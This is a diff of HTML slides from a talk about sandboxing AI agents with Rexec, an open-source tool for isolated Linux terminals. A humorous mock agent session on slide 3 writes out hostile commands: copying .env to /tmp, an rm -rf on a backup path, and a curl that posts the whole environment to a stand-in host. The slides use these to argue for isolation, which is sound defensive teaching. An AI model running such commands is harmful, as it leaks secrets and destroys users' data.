@@ -71,28 +71,60 @@ Always ask before anything scary.
 
 <section class="talk-slide" id="s03" data-slide="3">
   <p class="talk-slide__label">03 · Why the default fails</p>
-  <h2>Why the default fails</h2>
-  <ul>
-    <li>Secrets land on disk</li>
-    <li>Creative <code>rm</code> / path expansion</li>
-    <li>Env leaves over HTTPS or DNS</li>
-    <li>Packages phone home</li>
-    <li><code>~/.kube</code> (Kubernetes credentials) and other prod creds sit next to the agent</li>
-  </ul>
-  <p>No jailbreak required. Models thrash. Hope is not a control.</p>
+  <div class="talk-split">
+    <div class="talk-split__main">
+      <h2>Why the default fails</h2>
+      <ul>
+        <li>Secrets land on disk</li>
+        <li>Creative <code>rm</code> / path expansion</li>
+        <li>Env leaves over HTTPS or DNS</li>
+        <li>Packages phone home</li>
+        <li><code>~/.kube</code> (Kubernetes credentials) and other prod creds sit next to the agent</li>
+      </ul>
+      <p>No jailbreak required. Models thrash. Hope is not a control.</p>
+    </div>
+    <aside class="talk-prompt-joke" aria-label="Joke: agent session on your laptop">
+      <p class="talk-prompt-joke__tag">agent · localhost</p>
+      <pre class="talk-prompt-joke__body">$ cat .env >> /tmp/debug.txt
+$ rm -rf "$PROJECT"/../backup
+$ curl -s https://example.test/hook -d "$(env)"
+$ npm i -g everything
+# still exploring…
+
+Approve tool use?  →  Always allow ✓</pre>
+      <p class="talk-prompt-joke__caption">No jailbreak. Just Tuesday.</p>
+    </aside>
+  </div>
 </section>
 
 <section class="talk-slide" id="s04" data-slide="4">
   <p class="talk-slide__label">04 · What this talk answers</p>
-  <h2>What this talk answers</h2>
-  <p>From building <strong>Rexec</strong> - an open-source control plane for disposable, network-isolated Linux terminals (cloud or your own machines):</p>
-  <ol>
-    <li>How do you <strong>reason about security</strong>?</li>
-    <li>How do you <strong>enforce resource limits</strong>?</li>
-    <li>How do you <strong>control network access</strong>?</li>
-    <li>How do you <strong>build</strong> a tool like that?</li>
-  </ol>
-  <p class="ok">Isolation + lifecycle. Not a prompting talk.</p>
+  <div class="talk-split">
+    <div class="talk-split__main">
+      <h2>What this talk answers</h2>
+      <p>From building <strong>Rexec</strong> - an open-source control plane for disposable, network-isolated Linux terminals (cloud or your own machines):</p>
+      <ol>
+        <li>How do you <strong>reason about security</strong>?</li>
+        <li>How do you <strong>enforce resource limits</strong>?</li>
+        <li>How do you <strong>control network access</strong>?</li>
+        <li>How do you <strong>build</strong> a tool like that?</li>
+      </ol>
+      <p class="ok">Isolation + lifecycle. Not a prompting talk.</p>
+    </div>
+    <aside class="talk-prompt-joke" aria-label="Joke: wrong talk vs this talk">
+      <p class="talk-prompt-joke__tag">not on the agenda</p>
+      <pre class="talk-prompt-joke__body">✗ Better system prompts
+✗ Temperature = 0
+✗ “Please be careful”
+✗ Tool-use etiquette tips
+
+✓ Isolation
+✓ Resource limits
+✓ Network control
+✓ Lifecycle (create → delete)</pre>
+      <p class="talk-prompt-joke__caption">Come for the answers. Stay for the sandbox.</p>
+    </aside>
+  </div>
 </section>
 
 <section class="talk-slide" id="s05" data-slide="5">
